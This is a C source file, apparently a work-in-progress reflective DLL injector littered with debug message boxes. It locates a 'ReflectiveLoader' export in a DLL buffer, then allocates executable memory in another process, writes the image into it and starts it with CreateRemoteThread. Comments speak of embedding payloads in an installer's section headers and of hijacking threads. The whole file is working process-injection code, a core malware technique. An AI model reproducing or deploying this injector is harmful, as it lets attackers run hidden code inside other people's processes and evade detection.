/* LoadLibraryManual.c */

#include "LoadLibraryManual.h"


#include <stdio.h>

DWORD Rva2Offset(DWORD dwRva, UINT_PTR fileBase)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)fileBase;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(fileBase + pDos->e_lfanew);
	PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
	// If RVA is in headers region, it maps to the same offset
	DWORD headersSize = pNt->OptionalHeader.SizeOfHeaders;
	if (dwRva < headersSize)
		return dwRva;

	for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; ++i)
	{
		DWORD secVA = pSec[i].VirtualAddress;
		DWORD secVS = pSec[i].Misc.VirtualSize; // use VirtualSize to test range
		DWORD secRaw = pSec[i].PointerToRawData;
		if (dwRva >= secVA && dwRva < secVA + secVS)
		{
			return (dwRva - secVA) + secRaw;
		}
	}
	// not found
	MessageBoxA(NULL, "Rva2Offset returns 0", "Debug", MB_OK);
	return 0;
}


//extern "C"
/*
DWORD Rva2Offset(DWORD dwRva, UINT_PTR dllBaseAddress)
{
	WORD wIndex                          = 0; // TODO: rename to something like sIndex or sectionIndex maybe?
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders         = NULL;

	// NOTE: dllBaseAddress points to the start of the PE which is the DOS Header which 
	// is defined by _IMAGE_DOS_HEADER
	// NOTE: dllBaseAddress still needs to be cast as a PIMAGE_DOS_HEADER tho

	// NOTE: gets a pointer to the start of the PE Header (also called NT Header) which 
	// is defined by _IMAGE_NT_HEADERS
	pNtHeaders = (PIMAGE_NT_HEADERS)(dllBaseAddress + ((PIMAGE_DOS_HEADER)dllBaseAddress)->e_lfanew);

	// pointer to the first section header
	// address of first section header = (address to the OptionalHeader) + SizeOfOptionalHeader
	// TODO: use IMAGE_FIRST_SECTION to get start address based on the PE header?
	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	// NOTE: the rva isn't in a section (address points to something before the section headers), return rva
	// we immeditly return the rva because using it should work and be valid since all of the dos and nt headers are
	// already properly mapped in memory 
	if (dwRva < pSectionHeader[0].PointerToRawData)
	{
		return dwRva;
	}

	// TODO: this SectionHeader logic stuff will need to be used later if we end up embedding our layloads into sectionheaders of our installer
	for(wIndex=0 ; wIndex < pNtHeaders->FileHeader.NumberOfSections ; wIndex++  )
	{   
		// if the RVA is within the current SectionHeader structure (VirtualAddress to VirtualAddress + SizeOfRawData) 
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData)  )           
		{
			// dwRva - VirtualAddress = Offset address of the RVA inside the SectionHeader 
			// 110 - 100 = 10... this is saying SectionHeader starts at VirtualAddress 100 and 
			// the VirtualAddress + offset will get us the rva (since the rva is stored in the sectionheader?)
			//
			//
			//
			// PointerToRawData is the offset (relative to the start of the PE File). it tells you where 
			// the SectionHeader's data begins
			//
			// which means: where SectionHeader's data begins + rva (offset) that gives us where specific data 
			// associated with the rva lives in the SectionHeader
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
		}
	}
	return 0;
}
*/


/* NOTES:
 * PEB-
 *
 *
 * - e_lfanew is the offset from DOS header to NT headers
 * - MZ Header == DOS Header
 *   NT Header == PE Header
 * */

//extern "C"
DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)
{
	MessageBoxA(NULL, "inside GetReflectiveLoaderOffset", "Debug", MB_OK);
	UINT_PTR dllBaseAddress   = 0;
	UINT_PTR uiExportDir     = 0; // PIMAGE_EXPORT_DIRECTORY
	UINT_PTR uiNameArray     = 0;
	UINT_PTR uiAddressArray  = 0;
	UINT_PTR uiNameOrdinals  = 0;
	DWORD dwCounter          = 0;
#ifdef _WIN64
	DWORD dwCompiledArch = 2;
#else
	// This will catch Win32 and WinRT.
	DWORD dwCompiledArch = 1;
#endif

	// Name of function we are trying to export/resolve in the dll
	LPCSTR lpProcName = "ReflectiveLoader";

	// base
	dllBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;  

	// TODO: things that can be used
	// DOS Header
	// NT Headers
	// File headers and optional headers
	// section headers


	//PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)(dllBaseAddress + ((PIMAGE_DOS_HEADER)dllBaseAddress)->e_lfanew);
	//DWORD dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	//PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((UINT_PTR)dllBaseAddress + dwExportDirRVA);


	// get the File Offset of the modules NT Header
	uiExportDir = dllBaseAddress + ((PIMAGE_DOS_HEADER)dllBaseAddress)->e_lfanew;


	// currenlty we can only process a PE file which is the same type as the one this fuction has
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	// NOTE: there's no work around for this, it is absolute
	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
	{
		if (dwCompiledArch != 1)
		{
			MessageBoxA(NULL, "32: return 0", "Debug", MB_OK);
			return 0;
		}
	}
	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
	{
		/*
		if (dwCompiledArch != 2)
		{
			MessageBoxA(NULL, "64: return 0", "Debug", MB_OK);
			return 0;
		}*/
	}
	else
	{
		MessageBoxA(NULL, "Bad magic value", "Debug", MB_OK);
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT  ];

	// get the File Offset of the export directory
	uiExportDir = dllBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, dllBaseAddress  );

	// get the File Offset for the array of name pointers
	uiNameArray = dllBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames, dllBaseAddress  );

	// get the File Offset for the array of addresses
	uiAddressArray = dllBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, dllBaseAddress  );

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = dllBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals, dllBaseAddress  );

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->NumberOfNames;

	char buffer[256];
	sprintf_s(buffer, sizeof(buffer), "Number of Names = %d", dwCounter);
	MessageBoxA(NULL, buffer, "Debug", MB_OK);

	// loop through all the exported functions to find the ReflectiveLoader
	while( dwCounter--  )
	{
		// char* prodName = (char*)((ULONG_PTR)pModule + arrayOfNamesRVAs[i]); // dll loaded equivalent
		char * cpExportedFunctionName = (char *)(dllBaseAddress + Rva2Offset( DEREF_32( uiNameArray  ), dllBaseAddress  ));
		MessageBoxA(NULL, cpExportedFunctionName, "Exported Function Name: ", MB_OK);

		if( strstr( cpExportedFunctionName, "ReflectiveLoader"  ) != NULL  )
		{
			// get the File Offset for the array of addresses
			uiAddressArray = dllBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, dllBaseAddress  );

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += ( DEREF_16( uiNameOrdinals  ) * sizeof(DWORD)  );

			MessageBoxA(NULL, "base address found for dll", "Debug", MB_OK);

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset( DEREF_32( uiAddressArray  ), dllBaseAddress  );
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}


//extern "C"
HANDLE WINAPI LoadLibraryManual(
		HANDLE hProcess, 
		LPVOID lpBuffer, 
		DWORD dwLength, 
		LPVOID lpParameter)
{
	BOOL bSuccess                             = FALSE;
	LPVOID lpRemoteLibraryBuffer              = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread                            = NULL;
	DWORD dwReflectiveLoaderOffset            = 0;
	DWORD dwThreadId                          = 0;


	MessageBoxA(NULL, "Inside LoadLibraryManaul()", "Debug", MB_OK);

	// __try
	// {
		// NOTE: do while loop is so break statements exit immeditly?
		do
		{
			if( !hProcess  || !lpBuffer || !dwLength  )
				break;

			// check if the library (lpBuffer) has a function called ReflectiveLoader
			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer); // TODO: fails here
			if (!dwReflectiveLoaderOffset)
			{
				MessageBoxA(NULL, "GetReflectiveLoaderOffset fails", "Debug", MB_OK);
				break;
			}

			// alloc memory (RWX) in the host process for the image...
			/*
			lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!lpRemoteLibraryBuffer)
			{
				MessageBoxA(NULL, "VirtualAllocEx fails", "Debug", MB_OK);
				break;
			}*/
			if (!hProcess)
			{
				MessageBoxA(NULL, "hProcess is NULL", "Debug", MB_OK);
			}


			lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!lpRemoteLibraryBuffer)
			{
				MessageBoxA(NULL, "VirtualAllocEx fails", "Debug", MB_OK);
				break;
			}
			MessageBoxA(NULL, "After virtualalloc", "Debug", MB_OK);

			// write the image into the host process...
			if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
			{
				MessageBoxA(NULL, "WriteProcessMemory fails", "Debug", MB_OK);
				break;
			}
			MessageBoxA(NULL, "After writeprocessmemory", "Debug", MB_OK);

			// add the offset to ReflectiveLoader() to the remote library address...
			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset  );
			MessageBoxA(NULL, "After pointer arithmetic", "Debug", MB_OK);

			// create a remote thread in the host process to call the ReflectiveLoader!
			// 1024*1024 bytes == 1MB which represents the stack size of the new thread
			// if the parameter is 0, it will use the default stack size
			// TODO: instead of creating a remote thread here, hijack a thread instead? 
			hThread = CreateRemoteThread(hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);
			if (!hThread)
			{
				MessageBoxA(NULL, "CreateRemoteThread fails", "Debug", MB_OK);
			}
			MessageBoxA(NULL, "After createremotethread", "Debug", MB_OK);


		} while( 0  );

		MessageBoxA(NULL, "Success? End of LoadLibraryManual() function", "Debug", MB_OK);


	return hThread;

}
